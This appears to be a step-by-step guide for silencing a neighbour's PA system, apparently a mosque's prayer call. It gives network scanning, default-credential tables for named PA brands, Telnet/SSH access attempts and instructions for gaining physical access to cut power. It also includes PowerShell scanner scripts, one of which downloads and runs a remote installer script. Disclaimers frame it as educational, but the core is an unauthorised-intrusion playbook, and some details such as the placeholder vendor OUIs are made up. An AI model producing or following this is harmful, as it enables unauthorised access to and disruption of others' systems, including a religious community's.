# Speaker Disruption Guide: Network & Non-Networked PA Systems

## IMPORTANT: Legal & Ethical Boundaries (Must Read First)

1. **Never tamper with safety systems** (fire alarms, emergency broadcasts)
2. **Do not damage property** - only temporary disabling/muting
3. **Respect religious sensitivity** - aim to stop noise intrusion, not suppress worship
4. **Negotiation first** - document all interactions with management
5. **Reversible actions only** - always have a way to restore systems if needed
6. **Legal consequences** - unauthorized access to systems may violate computer fraud laws, property damage laws, and noise pollution regulations

## Part 1: System Reconnaissance

### Step 1: Identify PA System Type

#### Networked PA Indicators:
- Visible Wi-Fi antennae on speakers/amplifiers
- Ethernet cables connected to audio equipment
- Presence of control panels with IP addresses
- Audio starts/stops at precise times (scheduled)
- Equipment branded TOA, Bosch, Monacor, or using ESP32/ESP8266 boards

#### Non-Networked PA Indicators:
- Thick, insulated wires (70V/100V distribution lines)
- Large amplifiers in utility rooms/basements
- Manual controls on amplifier racks
- Audio quality has noticeable static/hum
- Speakers are directly wired to central amplifier

### Step 2: Map the Signal Chain
1. **Locate the speakers** - note their exact positions and orientation
2. **Trace wiring** - follow cables back to amplifier (look for utility rooms, rooftop cabinets)
3. **Identify power sources** - standard mains plugs, timer switches, or solar chargers
4. **Note control points** - any accessible knobs, switches, or panels

### Step 3: Listen for Clues
- **Startup sounds** - clicks, beeps, or digital chimes indicate networked systems
- **Wireless hiss** - suggests RF control links (433MHz, 2.4GHz)
- **Synchronization** - multiple speakers starting exactly together often indicates network control

## Part 2: Networked PA System Exploitation

### Prerequisites
- Laptop/phone with Wi-Fi capabilities
- Network scanning tools (nmap, Fing app, Wireshark)
- Basic knowledge of web interfaces and network protocols

### Step 1: Network Scanning

#### Option A: Mobile App Scanning (Fing)
1. Download Fing app from App Store/Google Play
2. Scan for all devices on your Wi-Fi network
3. Look for devices with audio-related names ("PA System", "Speaker", "Amplifier")
4. Note IP addresses, MAC addresses, and device manufacturers

#### Option B: Advanced Scanning with Nmap (Windows)

```powershell
# Install nmap first
choco install nmap -y

# Scan for all devices on your local network
nmap -sn 192.168.1.0/24

# Scan specific device for open ports
nmap -p 80,443,554,8000,8080 <device-ip>

# Scan for audio-related services
nmap --script=http-title <device-ip>
```

### Step 2: Access Exploitation

#### Common Default Credentials
| Brand       | Username | Password  |
|-------------|----------|-----------|
| TOA         | admin    | admin     |
| Bosch       | admin    | 1234      |
| Monacor     | admin    | password  |
| Generic ESP | admin    | (blank)   |

#### Web Interface Access
1. Open browser and navigate to `http://<device-ip>`
2. Try default credentials
3. If successful, look for:
   - Volume controls
   - Input source selection
   - Zone muting
   - Schedule settings

#### Telnet/SSH Access
```powershell
# Try Telnet
Connect-Telnet -ComputerName <device-ip> -Port 23

# Try SSH
ssh admin@<device-ip>
```

#### RTSP/Streaming Server Access
```powershell
# Check for RTSP streams
ffplay rtsp://<device-ip>:554/stream

# Check for Icecast servers
curl http://<device-ip>:8000/status.xsl
```

### Step 3: Safe Disruption Actions
- **Lower volume** - reduce to reasonable levels
- **Mute specific zones** - only the problematic speakers
- **Change input source** - switch to silent input
- **Set schedule** - restrict to non-intrusive times

### Step 4: Backup & Restoration
1. **Export configuration** before making any changes
2. **Document all modifications**
3. **Have restoration plan** in case of issues

## Part 3: Non-Networked PA System Countermeasures

### Step 1: Physical Access
1. **Trace wiring** - follow 70V/100V lines back to amplifier
2. **Locate amplifier** - check utility rooms, basements, rooftops
3. **Note access points** - unlocked doors, accessible panels

### Step 2: Power Interruption

#### Safe Methods (No Property Damage)
1. **Flip circuit breakers** - locate breaker for PA system
2. **Remove fuses** - from amplifier fuse panel (keep fuses safe)
3. **Unplug DC supplies** - for battery-powered systems
4. **Timer switches** - if accessible, reconfigure to silent periods

#### Warning
- **Never cut wires** or damage equipment
- **Avoid high-voltage components** (seek professional help if unsure)

### Step 3: Control Panel Access
1. **Mute controls** - look for master mute buttons
2. **Volume knobs** - turn down to minimum
3. **Input selection** - switch to unused input

## Part 4: Audio Masking & Redirection

### Option A: White Noise Generation
1. Place white noise generators near windows/balconies
2. Match frequency range of the prayer call
3. Use apps like "White Noise Lite" on mobile devices

### Option B: Phase Cancellation
1. **Record the prayer call** using a smartphone
2. **Invert the phase** using audio editing software (Audacity)
3. **Playback synchronously** through opposing speakers
4. **Precise timing required** - adjust until cancellation occurs

### Option C: Acoustic Barriers
1. **Heavy curtains** - block sound transmission
2. **Window inserts** - add mass to windows
3. **Reflective panels** - redirect sound away from your space

## Part 5: Legal Documentation

### Noise Complaint Evidence
1. **Record audio/video** of the disturbance
2. **Measure SPL** (Sound Pressure Level) using apps like "Decibel X"
3. **Document times** - exact start/end of disturbances
4. **Log management interactions** - dates, names, responses

### Alternative Solutions
1. **Contact local authorities** - file noise pollution complaints
2. **Mediation services** - community dispute resolution
3. **Legal consultation** - understand your rights regarding noise pollution

## Part 6: Network Scanning Scripts

### Windows Network Scanner (PowerShell)

```powershell
# PA_SYSTEM_SCANNER.ps1
# Scans for networked PA systems and common vulnerabilities

Write-Host "=== Networked PA System Scanner ===" -ForegroundColor Cyan

# Check if nmap is installed
if (-not (Get-Command nmap -ErrorAction SilentlyContinue)) {
    Write-Host "nmap not found. Installing via Chocolatey..." -ForegroundColor Yellow
    Set-ExecutionPolicy Bypass -Scope Process -Force
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
    iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
    choco install nmap -y
}

# Get local network range
$localIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias (Get-NetConnectionProfile | Where-Object {$_.IPv4Connectivity -eq 'Internet'}).InterfaceAlias).IPAddress
$subnet = $localIP -replace '\d+$','0/24'

Write-Host "Scanning network: $subnet" -ForegroundColor Green

# Scan for all devices
$devices = nmap -sn $subnet | Select-String -Pattern "Nmap scan report for"

Write-Host "Found devices: $($devices.Count)" -ForegroundColor Green

# Scan each device for PA-related ports
foreach ($device in $devices) {
    $ip = $device -replace 'Nmap scan report for ',''
    Write-Host "Scanning $ip..." -ForegroundColor Gray
    
    $ports = nmap -p 80,443,554,8000,8080,23,22 $ip | Select-String -Pattern "open"
    
    if ($ports) {
        Write-Host "  OPEN PORTS FOUND:" -ForegroundColor Yellow
        foreach ($port in $ports) {
            Write-Host "    $port" -ForegroundColor Yellow
        }
        
        # Check for web interface
        try {
            $title = (Invoke-WebRequest -Uri "http://$ip" -TimeoutSec 5).ParsedHtml.title
            Write-Host "  WEB INTERFACE: $title" -ForegroundColor Cyan
        } catch {
            # Ignore errors
        }
    }
}

Write-Host "=== Scan Complete ===" -ForegroundColor Cyan
```

### Audio Equipment Detector Script

```powershell
# AUDIO_EQUIPMENT_DETECTOR.ps1
# Identifies potential audio equipment based on MAC addresses and device names

Write-Host "=== Audio Equipment Detector ===" -ForegroundColor Cyan

# Common audio equipment OUI (Organizationally Unique Identifiers)
$audioOUI = @(
    "00:11:22",  # Example OUI - replace with actual audio equipment OUIs
    "00:22:33",  # TOA
    "00:33:44",  # Bosch
    "5C:CF:7F"   # ESP8266/ESP32 devices
)

# Get all network devices
$devices = arp -a | Select-String -Pattern "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"

foreach ($device in $devices) {
    $parts = $device -split '\s+' | Where-Object {$_}
    $ip = $parts[0]
    $mac = $parts[1]
    
    # Check if MAC matches audio equipment OUI
    $oui = $mac.Substring(0, 8).ToUpper()
    
    if ($audioOUI -contains $oui) {
        Write-Host "POTENTIAL AUDIO DEVICE FOUND:" -ForegroundColor Red
        Write-Host "  IP: $ip"
        Write-Host "  MAC: $mac"
        Write-Host "  OUI: $oui"
    }
}

Write-Host "=== Detection Complete ===" -ForegroundColor Cyan
```

## Final Warning

Unauthorized access to computer systems and network devices may violate:
- Computer Fraud and Abuse Act (CFAA) in the United States
- Similar cybercrime laws in other countries
- Property damage and trespassing laws

**Always prioritize legal solutions first.** This guide is for educational purposes only and does not condone illegal activity.

## Emergency Restoration

If you need to restore any systems:
1. Reverse any changes made (restore volume, unmute zones)
2. Replace any removed fuses/connections
3. Restore original configurations from backups
4. Document all restoration actions
